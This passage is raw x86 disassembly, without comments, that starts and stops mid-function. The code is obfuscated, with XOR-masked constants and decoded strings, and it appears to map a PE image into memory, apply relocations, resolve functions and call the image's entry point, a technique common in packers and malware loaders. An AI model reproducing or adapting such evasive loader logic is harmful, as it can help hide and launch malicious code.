  4276a2:	cmp    ecx,eax
  4276a4:	je     0x4276ac
  4276a6:	mov    eax,DWORD PTR [eax+ebx*4]
  4276a9:	mov    DWORD PTR [ebp-0x14],eax
  4276ac:	mov    eax,DWORD PTR [ebp-0x1c]
  4276af:	mov    eax,DWORD PTR [eax+ebx*4]
  4276b2:	mov    DWORD PTR [ebp+0xc],eax
  4276b5:	mov    eax,DWORD PTR [ebp-0x4]
  4276b8:	mov    ecx,DWORD PTR [ebp-0x14]
  4276bb:	xor    eax,esi
  4276bd:	add    eax,edi
  4276bf:	cmp    eax,ecx
  4276c1:	je     0x4276ec
  4276c3:	mov    eax,DWORD PTR [ebp-0x4]
  4276c6:	mov    ecx,DWORD PTR [ebp-0x14]
  4276c9:	xor    eax,esi
  4276cb:	add    eax,edi
  4276cd:	shr    ecx,0x1f
  4276d0:	cmp    eax,ecx
  4276d2:	je     0x4276ec
  4276d4:	mov    ecx,DWORD PTR [ebp-0x14]
  4276d7:	mov    eax,DWORD PTR [ebp+0x10]
  4276da:	mov    eax,DWORD PTR [eax+0x1e0]
  4276e0:	movzx  ecx,cx
  4276e3:	push   ecx
  4276e4:	push   DWORD PTR [ebp-0xc]
  4276e7:	call   DWORD PTR [eax+0x8]
  4276ea:	jmp    0x427705
  4276ec:	mov    eax,DWORD PTR [ebp+0xc]
  4276ef:	add    eax,DWORD PTR [ebp+0x8]
  4276f2:	mov    ecx,DWORD PTR [ebp+0x10]
  4276f5:	mov    ecx,DWORD PTR [ecx+0x1e0]
  4276fb:	add    eax,0x2
  4276fe:	push   eax
  4276ff:	push   DWORD PTR [ebp-0xc]
  427702:	call   DWORD PTR [ecx+0x8]
  427705:	mov    DWORD PTR [ebp+0xc],eax
  427708:	mov    eax,DWORD PTR [ebp-0x4]
  42770b:	mov    ecx,DWORD PTR [ebp+0xc]
  42770e:	xor    eax,esi
  427710:	add    eax,edi
  427712:	cmp    eax,ecx
  427714:	mov    eax,DWORD PTR [ebp-0x8]
  427717:	jne    0x42772a
  427719:	mov    ecx,DWORD PTR [ebp-0x18]
  42771c:	xor    eax,esi
  42771e:	lea    eax,[ecx+eax*1+0x3272f5]
  427725:	mov    DWORD PTR [ebp-0x18],eax
  427728:	jmp    0x42773a
  42772a:	mov    ecx,DWORD PTR [ebp+0xc]
  42772d:	xor    eax,esi
  42772f:	add    eax,edi
  427731:	imul   eax,ecx
  427734:	mov    ecx,DWORD PTR [ebp-0x1c]
  427737:	mov    DWORD PTR [ecx+ebx*4],eax
  42773a:	mov    eax,DWORD PTR [ebp-0x8]
  42773d:	xor    eax,esi
  42773f:	lea    ebx,[ebx+eax*1+0x3272f5]
  427746:	mov    eax,DWORD PTR [ebp-0x4]
  427749:	mov    ecx,DWORD PTR [ebp-0x1c]
  42774c:	xor    eax,esi
  42774e:	add    eax,edi
  427750:	cmp    DWORD PTR [ecx+ebx*4],eax
  427753:	jne    0x427684
  427759:	mov    edx,DWORD PTR [ebp-0x10]
  42775c:	mov    eax,DWORD PTR [ebp-0x18]
  42775f:	mov    ecx,DWORD PTR [ebp-0x2c]
  427762:	sub    edx,0x3272f4
  427768:	xor    edx,esi
  42776a:	jmp    0x427534
  42776f:	mov    ecx,DWORD PTR [ebp-0x4]
  427772:	xor    ecx,esi
  427774:	add    ecx,edi
  427776:	cmp    eax,ecx
  427778:	mov    eax,DWORD PTR [ebp-0x4]
  42777b:	jne    0x427785
  42777d:	mov    eax,DWORD PTR [ebp-0x8]
  427780:	jmp    0x427785
  427782:	mov    eax,DWORD PTR [ebp-0x4]
  427785:	xor    eax,esi
  427787:	add    eax,edi
  427789:	pop    edi
  42778a:	pop    esi
  42778b:	pop    ebx
  42778c:	leave  
  42778d:	ret    0xc
  427790:	push   ebp
  427791:	mov    ebp,esp
  427793:	sub    esp,0x28
  427796:	mov    DWORD PTR [ebp-0x4],0xf89c85a5
  42779d:	mov    DWORD PTR [ebp-0x28],0xf89c85a2
  4277a4:	mov    eax,DWORD PTR [ebp+0xc]
  4277a7:	mov    DWORD PTR [ebp+0xc],eax
  4277aa:	push   esi
  4277ab:	mov    eax,eax
  4277ad:	mov    eax,DWORD PTR [ebp-0x4]
  4277b0:	mov    esi,DWORD PTR [ebp+0x8]
  4277b3:	mov    ecx,0x75108ae
  4277b8:	xor    eax,ecx
  4277ba:	mov    edx,0x3272f5
  4277bf:	add    eax,edx
  4277c1:	cmp    esi,eax
  4277c3:	je     0x4278ea
  4277c9:	mov    eax,DWORD PTR [ebp+0x8]
  4277cc:	mov    esi,DWORD PTR [ebp+0x8]
  4277cf:	add    esi,DWORD PTR [eax+0x3c]
  4277d2:	push   edi
  4277d3:	mov    DWORD PTR [ebp+0xc],esi
  4277d6:	mov    DWORD PTR [ebp-0x1c],0xf89c85be
  4277dd:	mov    eax,DWORD PTR [ebp-0x1c]
  4277e0:	mov    esi,DWORD PTR [ebp-0x4]
  4277e3:	mov    edi,DWORD PTR [ebp+0xc]
  4277e6:	xor    esi,ecx
  4277e8:	xor    eax,ecx
  4277ea:	add    esi,edx
  4277ec:	cmp    DWORD PTR [edi+eax*8+0x1939820],esi
  4277f3:	je     0x4278e4
  4277f9:	mov    esi,DWORD PTR [ebp+0xc]
  4277fc:	mov    eax,DWORD PTR [ebp+0x8]
  4277ff:	add    eax,DWORD PTR [esi+0xa0]
  427805:	mov    esi,DWORD PTR [ebp+0x8]
  427808:	mov    edi,DWORD PTR [ebp+0xc]
  42780b:	sub    esi,DWORD PTR [edi+0x34]
  42780e:	mov    edi,DWORD PTR [ebp-0x4]
  427811:	xor    edi,ecx
  427813:	add    edi,edx
  427815:	mov    DWORD PTR [ebp-0x24],esi
  427818:	cmp    esi,edi
  42781a:	je     0x4278e4
  427820:	mov    esi,DWORD PTR [ebp-0x4]
  427823:	xor    esi,ecx
  427825:	add    esi,edx
  427827:	mov    DWORD PTR [ebp-0x8],esi
  42782a:	push   ebx
  42782b:	mov    DWORD PTR [ebp-0x10],0xf89c85a0
  427832:	jmp    0x4278ce
  427837:	mov    esi,DWORD PTR [ebp-0x4]
  42783a:	xor    esi,ecx
  42783c:	lea    edi,[ebx-0x8]
  42783f:	add    esi,edx
  427841:	shr    edi,1
  427843:	cmp    esi,edi
  427845:	jae    0x4278b4
  427847:	sub    edi,esi
  427849:	lea    ebx,[eax+esi*2+0x8]
  42784d:	mov    DWORD PTR [ebp-0x18],edi
  427850:	movzx  esi,WORD PTR [ebx]
  427853:	and    esi,0xfff
  427859:	mov    DWORD PTR [ebp-0x14],esi
  42785c:	mov    edi,DWORD PTR [ebp-0x14]
  42785f:	mov    esi,DWORD PTR [eax]
  427861:	sub    esi,edx
  427863:	add    edi,esi
  427865:	movzx  esi,WORD PTR [ebx]
  427868:	shr    esi,0xc
  42786b:	xor    edi,ecx
  42786d:	mov    DWORD PTR [ebp-0x20],edi
  427870:	mov    DWORD PTR [ebp-0x14],esi
  427873:	mov    esi,DWORD PTR [ebp-0x20]
  427876:	mov    edi,DWORD PTR [ebp+0x8]
  427879:	xor    esi,ecx
  42787b:	lea    esi,[esi+edi*1+0x3272f5]
  427882:	mov    DWORD PTR [ebp-0x20],esi
  427885:	mov    esi,DWORD PTR [ebp-0x10]
  427888:	mov    edi,DWORD PTR [ebp-0x14]
  42788b:	xor    esi,ecx
  42788d:	add    esi,edx
  42788f:	cmp    edi,esi
  427891:	jne    0x4278a9
  427893:	mov    esi,DWORD PTR [ebp-0x10]
  427896:	mov    edi,DWORD PTR [ebp-0x14]
  427899:	xor    esi,ecx
  42789b:	add    esi,edx
  42789d:	cmp    edi,esi
  42789f:	jne    0x4278a9
  4278a1:	mov    esi,DWORD PTR [ebp-0x20]
  4278a4:	mov    edi,DWORD PTR [ebp-0x24]
  4278a7:	add    DWORD PTR [esi],edi
  4278a9:	add    ebx,0x2
  4278ac:	dec    DWORD PTR [ebp-0x18]
  4278af:	jne    0x427850
  4278b1:	mov    ebx,DWORD PTR [ebp-0xc]
  4278b4:	add    DWORD PTR [ebp-0x8],ebx
  4278b7:	mov    esi,DWORD PTR [ebp-0x1c]
  4278ba:	mov    edi,DWORD PTR [ebp-0x8]
  4278bd:	mov    ebx,DWORD PTR [ebp+0xc]
  4278c0:	xor    esi,ecx
  4278c2:	cmp    edi,DWORD PTR [ebx+esi*8+0x1939824]
  4278c9:	jae    0x4278e3
  4278cb:	add    eax,DWORD PTR [ebp-0xc]
  4278ce:	mov    esi,DWORD PTR [ebp-0x4]
  4278d1:	mov    ebx,DWORD PTR [eax+0x4]
  4278d4:	xor    esi,ecx
  4278d6:	add    esi,edx
  4278d8:	mov    DWORD PTR [ebp-0xc],ebx
  4278db:	cmp    ebx,esi
  4278dd:	jne    0x427837
  4278e3:	pop    ebx
  4278e4:	mov    eax,DWORD PTR [ebp-0x28]
  4278e7:	pop    edi
  4278e8:	jmp    0x4278ed
  4278ea:	mov    eax,DWORD PTR [ebp-0x4]
  4278ed:	xor    eax,ecx
  4278ef:	add    eax,edx
  4278f1:	pop    esi
  4278f2:	leave  
  4278f3:	ret    0x8
  4278f6:	push   ebp
  4278f7:	mov    ebp,esp
  4278f9:	sub    esp,0xd8
  4278ff:	mov    DWORD PTR [ebp-0x4],0xf89c85a5
  427906:	mov    DWORD PTR [ebp-0x24],0xf89c85a2
  42790d:	mov    eax,DWORD PTR [ebp-0x4]
  427910:	push   ebx
  427911:	push   esi
  427912:	mov    esi,0x75108ae
  427917:	xor    eax,esi
  427919:	push   edi
  42791a:	mov    edi,0x3272f5
  42791f:	add    eax,edi
  427921:	mov    DWORD PTR [ebp-0x18],eax
  427924:	mov    eax,DWORD PTR [ebp-0x4]
  427927:	xor    eax,esi
  427929:	add    eax,edi
  42792b:	mov    DWORD PTR [ebp-0x8],eax
  42792e:	mov    ebx,DWORD PTR [ebp+0x20]
  427931:	mov    eax,DWORD PTR [ebp-0x1c]
  427934:	mov    ecx,DWORD PTR [ebp-0x1c]
  427937:	xor    eax,ecx
  427939:	mov    DWORD PTR [ebp-0x1c],eax
  42793c:	add    DWORD PTR [ebp-0x1c],0xf89cb5a5
  427943:	mov    eax,DWORD PTR [ebp-0xc]
  427946:	mov    ecx,DWORD PTR [ebp-0xc]
  427949:	xor    eax,ecx
  42794b:	mov    DWORD PTR [ebp-0xc],eax
  42794e:	add    DWORD PTR [ebp-0xc],0xf89c85e5
  427955:	mov    eax,DWORD PTR [ebp-0x10]
  427958:	mov    ecx,DWORD PTR [ebp-0x10]
  42795b:	xor    eax,ecx
  42795d:	mov    DWORD PTR [ebp-0x10],eax
  427960:	add    DWORD PTR [ebp-0x10],0xf89c85a1
  427967:	mov    eax,DWORD PTR [ebp-0x28]
  42796a:	mov    ecx,DWORD PTR [ebp-0x28]
  42796d:	xor    eax,ecx
  42796f:	mov    DWORD PTR [ebp-0x28],eax
  427972:	add    DWORD PTR [ebp-0x28],0xf89f05a5
  427979:	mov    DWORD PTR [ebp+0x20],0xf89ceff6
  427980:	mov    eax,DWORD PTR [ebp+0x8]
  427983:	test   eax,eax
  427985:	je     0x427e0c
  42798b:	mov    eax,DWORD PTR [ebp+0xc]
  42798e:	test   eax,eax
  427990:	je     0x427e0c
  427996:	mov    eax,DWORD PTR [ebp+0x18]
  427999:	test   eax,eax
  42799b:	je     0x427e0c
  4279a1:	mov    eax,DWORD PTR [ebp+0x20]
  4279a4:	mov    ecx,DWORD PTR [ebp+0x8]
  4279a7:	xor    eax,0x8ae
  4279ac:	add    eax,0x72f5
  4279b1:	cmp    WORD PTR [ecx],ax
  4279b4:	jne    0x427e0c
  4279ba:	mov    eax,DWORD PTR [ebp-0x4]
  4279bd:	xor    eax,esi
  4279bf:	add    eax,edi
  4279c1:	mov    DWORD PTR [ebp-0x30],eax
  4279c4:	mov    eax,DWORD PTR [ebp-0x4]
  4279c7:	mov    ecx,DWORD PTR [ebp+0x8]
  4279ca:	mov    eax,DWORD PTR [ebp+0x8]
  4279cd:	add    eax,DWORD PTR [ecx+0x3c]
  4279d0:	mov    DWORD PTR [ebp+0xc],eax
  4279d3:	mov    eax,DWORD PTR [eax+0x50]
  4279d6:	test   eax,eax
  4279d8:	je     0x427e0c
  4279de:	mov    DWORD PTR [ebp-0x2c],0xf88c85a5
  4279e5:	mov    eax,DWORD PTR [ebp-0x2c]
  4279e8:	xor    eax,esi
  4279ea:	add    eax,edi
  4279ec:	mov    DWORD PTR [ebp-0x2c],eax
  4279ef:	mov    eax,DWORD PTR [ebp-0x4]
  4279f2:	mov    eax,DWORD PTR [ebx+0x190]
  4279f8:	mov    ecx,DWORD PTR [eax]
  4279fa:	mov    ecx,DWORD PTR [ecx+0x3c]
  4279fd:	add    ecx,DWORD PTR [eax]
  4279ff:	mov    eax,DWORD PTR [ebp-0x4]
  427a02:	mov    eax,DWORD PTR [ebx+0x18c]
  427a08:	mov    edx,DWORD PTR [eax]
  427a0a:	mov    DWORD PTR [ebp-0x20],ecx
  427a0d:	mov    DWORD PTR [ebp+0x20],edx
  427a10:	cmp    edx,edx
  427a12:	jne    0x427a46
  427a14:	mov    eax,DWORD PTR [ebx+0x1e0]
  427a1a:	lea    edx,[ebp-0x18]
  427a1d:	push   edx
  427a1e:	mov    edx,DWORD PTR [ebp-0xc]
  427a21:	xor    edx,esi
  427a23:	add    edx,edi
  427a25:	push   edx
  427a26:	push   DWORD PTR [ecx+0x50]
  427a29:	push   DWORD PTR [ebp+0x20]
  427a2c:	call   DWORD PTR [eax+0x1c]
  427a2f:	mov    eax,DWORD PTR [ebp-0x20]
  427a32:	mov    ecx,DWORD PTR [eax+0x54]
  427a35:	mov    eax,DWORD PTR [eax+0x50]
  427a38:	sub    eax,ecx
  427a3a:	add    ecx,DWORD PTR [ebp+0x20]
  427a3d:	push   ecx
  427a3e:	call   0x4283a9
  427a43:	mov    edx,DWORD PTR [ebp+0x20]
  427a46:	mov    eax,DWORD PTR [ebx+0x194]
  427a4c:	mov    DWORD PTR [eax],edx
  427a4e:	mov    eax,DWORD PTR [ebp+0xc]
  427a51:	push   DWORD PTR [eax+0x54]
  427a54:	push   DWORD PTR [ebp+0x8]
  427a57:	push   edx
  427a58:	call   0x42829f
  427a5d:	mov    ecx,DWORD PTR [ebp+0x20]
  427a60:	mov    eax,DWORD PTR [ecx+0x3c]
  427a63:	add    eax,ecx
  427a65:	movzx  ecx,WORD PTR [eax+0x14]
  427a69:	lea    ecx,[ecx+eax*1+0x18]
  427a6d:	mov    DWORD PTR [ebp+0x18],ecx
  427a70:	mov    ecx,DWORD PTR [ebp-0x4]
  427a73:	movzx  edx,WORD PTR [eax+0x6]
  427a77:	xor    ecx,esi
  427a79:	add    ecx,edi
  427a7b:	mov    DWORD PTR [ebp+0xc],eax
  427a7e:	cmp    edx,ecx
  427a80:	je     0x427b2d
  427a86:	mov    ecx,DWORD PTR [ebp-0x4]
  427a89:	xor    ecx,esi
  427a8b:	add    ecx,edi
  427a8d:	mov    DWORD PTR [ebp-0x8],ecx
  427a90:	mov    ecx,DWORD PTR [ebp-0x24]
  427a93:	movzx  edx,WORD PTR [eax+0x6]
  427a97:	xor    ecx,esi
  427a99:	sub    edx,ecx
  427a9b:	sub    edx,edi
  427a9d:	cmp    DWORD PTR [ebp-0x8],edx
  427aa0:	ja     0x427b2d
  427aa6:	mov    edx,DWORD PTR [ebp+0x18]
  427aa9:	add    edx,0x8
  427aac:	mov    DWORD PTR [ebp+0x18],edx
  427aaf:	jmp    0x427ab4
  427ab1:	mov    edx,DWORD PTR [ebp+0x18]
  427ab4:	mov    eax,DWORD PTR [eax+0x38]
  427ab7:	lea    ecx,[eax-0x1]
  427aba:	mov    DWORD PTR [ebp-0x38],eax
  427abd:	mov    eax,DWORD PTR [edx]
  427abf:	test   eax,ecx
  427ac1:	je     0x427aca
  427ac3:	not    ecx
  427ac5:	and    eax,ecx
  427ac7:	add    eax,DWORD PTR [ebp-0x38]
  427aca:	mov    ecx,DWORD PTR [edx+0x4]
  427acd:	add    ecx,DWORD PTR [ebp+0x20]
  427ad0:	push   ecx
  427ad1:	call   0x4283a9
  427ad6:	mov    edx,DWORD PTR [ebp-0x4]
  427ad9:	mov    eax,DWORD PTR [ebp+0x18]
  427adc:	mov    ecx,DWORD PTR [eax+0x8]
  427adf:	xor    edx,esi
  427ae1:	add    edx,edi
  427ae3:	cmp    ecx,edx
  427ae5:	je     0x427afe
  427ae7:	push   ecx
  427ae8:	mov    ecx,DWORD PTR [ebp+0x8]
  427aeb:	add    ecx,DWORD PTR [eax+0xc]
  427aee:	mov    eax,DWORD PTR [eax+0x4]
  427af1:	add    eax,DWORD PTR [ebp+0x20]
  427af4:	push   ecx
  427af5:	push   eax
  427af6:	call   0x42829f
  427afb:	mov    eax,DWORD PTR [ebp+0x18]
  427afe:	mov    ecx,DWORD PTR [ebp-0x24]
  427b01:	mov    edx,DWORD PTR [ebp-0x8]
  427b04:	add    eax,0x28
  427b07:	xor    ecx,esi
  427b09:	lea    ecx,[edx+ecx*1+0x3272f5]
  427b10:	mov    edx,DWORD PTR [ebp+0xc]
  427b13:	mov    DWORD PTR [ebp+0x18],eax
  427b16:	mov    eax,DWORD PTR [ebp-0x24]
  427b19:	movzx  edx,WORD PTR [edx+0x6]
  427b1d:	xor    eax,esi
  427b1f:	sub    edx,eax
  427b21:	mov    eax,DWORD PTR [ebp+0xc]
  427b24:	sub    edx,edi
  427b26:	mov    DWORD PTR [ebp-0x8],ecx
  427b29:	cmp    ecx,edx
  427b2b:	jbe    0x427ab1
  427b2d:	mov    edx,DWORD PTR [ebx+0x18c]
  427b33:	mov    ecx,DWORD PTR [ebp+0x20]
  427b36:	cmp    ecx,DWORD PTR [edx]
  427b38:	jne    0x427b61
  427b3a:	mov    eax,DWORD PTR [ebx+0x1e0]
  427b40:	lea    edx,[ebp-0x18]
  427b43:	push   edx
  427b44:	mov    edx,DWORD PTR [ebp-0x10]
  427b47:	xor    edx,esi
  427b49:	add    edx,edi
  427b4b:	push   edx
  427b4c:	mov    edx,DWORD PTR [ebp-0x20]
  427b4f:	push   DWORD PTR [edx+0x54]
  427b52:	push   ecx
  427b53:	call   DWORD PTR [eax+0x1c]
  427b56:	test   eax,eax
  427b58:	je     0x427dfd
  427b5e:	mov    eax,DWORD PTR [ebp+0xc]
  427b61:	mov    ecx,DWORD PTR [ebx+0x1c8]
  427b67:	mov    ecx,DWORD PTR [ecx]
  427b69:	xor    ecx,esi
  427b6b:	add    ecx,edi
  427b6d:	je     0x427d28
  427b73:	mov    eax,DWORD PTR [ebp-0x4]
  427b76:	xor    eax,esi
  427b78:	add    eax,edi
  427b7a:	and    DWORD PTR [ebp+0x8],0x0
  427b7e:	mov    DWORD PTR [ebp-0x14],eax
  427b81:	mov    eax,0xf89c85c1
  427b86:	lea    ecx,[eax+0x18]
  427b89:	mov    DWORD PTR [ebp-0x58],0xf89c85d7
  427b90:	mov    DWORD PTR [ebp-0x54],0xf89c85d1
  427b97:	mov    DWORD PTR [ebp-0x50],eax
  427b9a:	mov    DWORD PTR [ebp-0x4c],ecx
  427b9d:	mov    DWORD PTR [ebp-0x48],ecx
  427ba0:	mov    DWORD PTR [ebp-0x44],0xf89c85a5
  427ba7:	mov    edx,DWORD PTR [ebp+0x8]
  427baa:	mov    ecx,0x8ae
  427baf:	xor    cx,WORD PTR [ebp+edx*4-0x58]
  427bb4:	mov    edx,0x72f5
  427bb9:	add    cx,dx
  427bbc:	mov    edx,DWORD PTR [ebp+0x8]
  427bbf:	inc    DWORD PTR [ebp+0x8]
  427bc2:	cmp    DWORD PTR [ebp+0x8],0x6
  427bc6:	mov    WORD PTR [ebp+edx*2-0xc0],cx
  427bce:	jb     0x427ba7
  427bd0:	mov    ecx,0xf89c85d3
  427bd5:	mov    DWORD PTR [ebp-0xb0],eax
  427bdb:	mov    DWORD PTR [ebp-0x9c],eax
  427be1:	mov    DWORD PTR [ebp-0x74],eax
  427be4:	mov    DWORD PTR [ebp-0x70],eax
  427be7:	lea    eax,[ecx-0x3]
  427bea:	lea    edx,[ecx+0x2c]
  427bed:	mov    DWORD PTR [ebp-0x64],eax
  427bf0:	mov    DWORD PTR [ebp-0x60],eax
  427bf3:	mov    DWORD PTR [ebp-0xb4],0xf89c85f9
  427bfd:	mov    DWORD PTR [ebp-0xac],ecx
  427c03:	mov    DWORD PTR [ebp-0xa8],edx
  427c09:	mov    DWORD PTR [ebp-0xa4],0xf89c85da
  427c13:	mov    DWORD PTR [ebp-0xa0],0xf89c85d7
  427c1d:	mov    DWORD PTR [ebp-0x98],0xf89c85fe
  427c27:	mov    DWORD PTR [ebp-0x94],0xf89c85d7
  427c31:	mov    DWORD PTR [ebp-0x90],0xf89c85d1
  427c3b:	mov    DWORD PTR [ebp-0x8c],ecx
  427c41:	mov    DWORD PTR [ebp-0x88],0xf89c852a
  427c4b:	mov    DWORD PTR [ebp-0x84],edx
  427c51:	mov    DWORD PTR [ebp-0x80],0xf89c85d4
  427c58:	mov    DWORD PTR [ebp-0x7c],ecx
  427c5b:	mov    DWORD PTR [ebp-0x78],0xf89c85e2
  427c62:	mov    DWORD PTR [ebp-0x6c],ecx
  427c65:	mov    DWORD PTR [ebp-0x68],0xf89c85de
  427c6c:	mov    DWORD PTR [ebp-0x5c],0xf89c85a5
  427c73:	xor    eax,eax
  427c75:	mov    cl,BYTE PTR [ebp+eax*4-0xb4]
  427c7c:	xor    cl,0xae
  427c7f:	sub    cl,0xb
  427c82:	mov    BYTE PTR [ebp+eax*1-0xd8],cl
  427c89:	inc    eax
  427c8a:	cmp    eax,0x17
  427c8d:	jb     0x427c75
  427c8f:	mov    eax,DWORD PTR [ebx+0x1e0]
  427c95:	lea    ecx,[ebp-0xc0]
  427c9b:	push   ecx
  427c9c:	call   DWORD PTR [eax+0x4]
  427c9f:	mov    ecx,DWORD PTR [ebx+0x1e0]
  427ca5:	lea    edx,[ebp-0xd8]
  427cab:	push   edx
  427cac:	push   eax
  427cad:	call   DWORD PTR [ecx+0x8]
  427cb0:	mov    DWORD PTR [ebp-0x40],eax
  427cb3:	lea    eax,[ebp-0x14]
  427cb6:	push   eax
  427cb7:	mov    eax,DWORD PTR [ebx+0x18c]
  427cbd:	push   DWORD PTR [eax]
  427cbf:	mov    eax,DWORD PTR [ebp-0x40]
  427cc2:	call   eax
  427cc4:	mov    eax,DWORD PTR [ebp-0x4]
  427cc7:	xor    eax,esi
  427cc9:	add    eax,edi
  427ccb:	mov    DWORD PTR [ebp-0x34],eax
  427cce:	mov    ecx,DWORD PTR [ebp-0x4]
  427cd1:	mov    eax,DWORD PTR [ebp-0x14]
  427cd4:	xor    ecx,esi
  427cd6:	add    ecx,edi
  427cd8:	cmp    eax,ecx
  427cda:	je     0x427d25
  427cdc:	mov    DWORD PTR [ebp-0x3c],eax
  427cdf:	jmp    0x427cf0
  427ce1:	mov    eax,DWORD PTR [eax]
  427ce3:	mov    ecx,DWORD PTR [ebp-0x3c]
  427ce6:	mov    DWORD PTR [ebp-0x14],eax
  427ce9:	mov    eax,DWORD PTR [ebp-0x14]
  427cec:	cmp    eax,ecx
  427cee:	je     0x427cfd
  427cf0:	mov    edx,DWORD PTR [eax+0x18]
  427cf3:	mov    ecx,DWORD PTR [ebx+0x18c]
  427cf9:	cmp    edx,DWORD PTR [ecx]
  427cfb:	jne    0x427ce1
  427cfd:	mov    ecx,DWORD PTR [ebx+0x18c]
  427d03:	mov    edx,DWORD PTR [eax+0x18]
  427d06:	cmp    edx,DWORD PTR [ecx]
  427d08:	jne    0x427d25
  427d0a:	mov    ecx,DWORD PTR [ebx+0x190]
  427d10:	mov    edx,DWORD PTR [ebp-0x20]
  427d13:	mov    edx,DWORD PTR [edx+0x28]
  427d16:	add    edx,DWORD PTR [ecx]
  427d18:	mov    DWORD PTR [eax+0x1c],edx
  427d1b:	mov    eax,DWORD PTR [ebp-0x24]
  427d1e:	xor    eax,esi
  427d20:	add    eax,edi
  427d22:	mov    DWORD PTR [ebp-0x34],eax
  427d25:	mov    eax,DWORD PTR [ebp+0xc]
  427d28:	push   ebx
  427d29:	push   eax
  427d2a:	push   DWORD PTR [ebp+0x20]
  427d2d:	call   0x4274ad
  427d32:	test   eax,eax
  427d34:	je     0x427dfd
  427d3a:	push   DWORD PTR [ebp+0xc]
  427d3d:	mov    ecx,ebx
  427d3f:	push   DWORD PTR [ebp+0x20]
  427d42:	call   0x427406
  427d47:	test   eax,eax
  427d49:	je     0x427dfd
  427d4f:	mov    eax,DWORD PTR [ebp+0xc]
  427d52:	mov    edx,DWORD PTR [ebp+0x20]
  427d55:	mov    ecx,ebx
  427d57:	call   0x4272df
  427d5c:	test   eax,eax
  427d5e:	je     0x427dfd
  427d64:	push   ebx
  427d65:	push   DWORD PTR [ebp+0x20]
  427d68:	call   0x427790
  427d6d:	test   eax,eax
  427d6f:	je     0x427dfd
  427d75:	mov    eax,DWORD PTR [ebx+0x18c]
  427d7b:	mov    edx,DWORD PTR [ebp+0x20]
  427d7e:	cmp    edx,DWORD PTR [eax]
  427d80:	jne    0x427d9c
  427d82:	mov    eax,DWORD PTR [ebx+0x1e0]
  427d88:	lea    ecx,[ebp-0x18]
  427d8b:	push   ecx
  427d8c:	push   DWORD PTR [ebp-0x18]
  427d8f:	mov    ecx,DWORD PTR [ebp-0x20]
  427d92:	push   DWORD PTR [ecx+0x54]
  427d95:	push   edx
  427d96:	call   DWORD PTR [eax+0x1c]
  427d99:	mov    edx,DWORD PTR [ebp+0x20]
  427d9c:	mov    eax,DWORD PTR [ebx+0x1c8]
  427da2:	mov    eax,DWORD PTR [eax]
  427da4:	xor    eax,esi
  427da6:	add    eax,edi
  427da8:	je     0x427de1
  427daa:	mov    ecx,DWORD PTR [ebp+0xc]
  427dad:	mov    eax,DWORD PTR [ecx+0x28]
  427db0:	mov    DWORD PTR [ebp+0x8],0xf89ca5a5
  427db7:	mov    esi,DWORD PTR [ebp+0x8]
  427dba:	push   DWORD PTR [ebp+0x14]
  427dbd:	xor    esi,0x8ae
  427dc3:	push   DWORD PTR [ebp+0x10]
  427dc6:	add    esi,0x72f5
  427dcc:	or     WORD PTR [ecx+0x16],si
  427dd0:	add    eax,edx
  427dd2:	push   edx
  427dd3:	call   eax
  427dd5:	mov    DWORD PTR [ebx+0x1d0],0xf89c85a2
  427ddf:	jmp    0x427deb
  427de1:	mov    eax,DWORD PTR [ebp+0xc]
  427de4:	mov    eax,DWORD PTR [eax+0x28]
  427de7:	add    eax,edx
  427de9:	call   eax
  427deb:	mov    DWORD PTR [ebp-0x8],eax
  427dee:	mov    eax,DWORD PTR [ebp-0x8]
  427df1:	mov    ecx,DWORD PTR [ebp+0x1c]
  427df4:	mov    DWORD PTR [ecx],eax
  427df6:	mov    DWORD PTR [ebp-0x30],0x1
  427dfd:	cmp    DWORD PTR [ebp-0x30],0x0
  427e01:	jne    0x427e07
  427e03:	and    DWORD PTR [ebp+0x20],0x0
  427e07:	mov    eax,DWORD PTR [ebp+0x20]
  427e0a:	jmp    0x427e0e
  427e0c:	xor    eax,eax
  427e0e:	pop    edi
  427e0f:	pop    esi
  427e10:	pop    ebx
  427e11:	leave  
  427e12:	ret    0x1c
  427e15:	push   ebp
  427e16:	mov    ebp,esp
  427e18:	movzx  edx,WORD PTR [ecx+0x6]
  427e1c:	movzx  eax,WORD PTR [ecx+0x14]
  427e20:	push   ebx
  427e21:	push   edi
  427e22:	xor    edi,edi
  427e24:	lea    eax,[eax+ecx*1+0x18]
  427e28:	test   edx,edx
  427e2a:	je     0x427e4b
  427e2c:	mov    ecx,DWORD PTR [eax+0xc]
  427e2f:	lea    ebx,[ecx+esi*1]
  427e32:	cmp    DWORD PTR [ebp+0x8],ebx
  427e35:	jb     0x427e43
  427e37:	mov    ebx,DWORD PTR [eax+0x8]
  427e3a:	add    ebx,ecx
  427e3c:	add    ebx,esi
  427e3e:	cmp    DWORD PTR [ebp+0x8],ebx
  427e41:	jb     0x427e4d
  427e43:	add    eax,0x28
  427e46:	inc    edi
  427e47:	cmp    edi,edx
  427e49:	jb     0x427e2c
  427e4b:	xor    eax,eax
  427e4d:	pop    edi
  427e4e:	pop    ebx
  427e4f:	pop    ebp
  427e50:	ret    0x4
  427e53:	push   ebp
  427e54:	mov    ebp,esp
  427e56:	sub    esp,0x34
  427e59:	mov    DWORD PTR [ebp-0xc],0xf89c85a5
  427e60:	mov    DWORD PTR [ebp-0x18],0xf89c85a2
  427e67:	mov    DWORD PTR [ebp-0x1c],0xf89c85a3
  427e6e:	mov    DWORD PTR [ebp-0x8],0xf89c85c2
  427e75:	mov    DWORD PTR [ebp-0x20],0xf89c85e2
  427e7c:	mov    DWORD PTR [ebp-0x2c],0xf89c852b
  427e83:	mov    DWORD PTR [ebp-0x2c],0xf89c85cb
  427e8a:	mov    DWORD PTR [ebp-0x10],eax
  427e8d:	mov    eax,DWORD PTR [ebp+0x8]
  427e90:	mov    DWORD PTR [ebp-0x14],eax
  427e93:	mov    eax,DWORD PTR [ebp-0xc]
  427e96:	push   ebx
  427e97:	mov    ecx,0x75108ae
  427e9c:	xor    eax,ecx
  427e9e:	push   esi
  427e9f:	mov    esi,DWORD PTR [ebp-0x10]
  427ea2:	mov    edx,0x3272f5
  427ea7:	add    eax,edx
  427ea9:	push   edi
  427eaa:	cmp    esi,eax
  427eac:	je     0x42808b
  427eb2:	mov    eax,DWORD PTR [ebp-0xc]
  427eb5:	mov    esi,DWORD PTR [ebp-0x14]
  427eb8:	xor    eax,ecx
  427eba:	add    eax,edx
  427ebc:	cmp    esi,eax
  427ebe:	je     0x42808b
  427ec4:	mov    eax,DWORD PTR [ebp-0xc]
  427ec7:	xor    eax,ecx
  427ec9:	add    eax,edx
  427ecb:	mov    DWORD PTR [ebp-0x24],eax
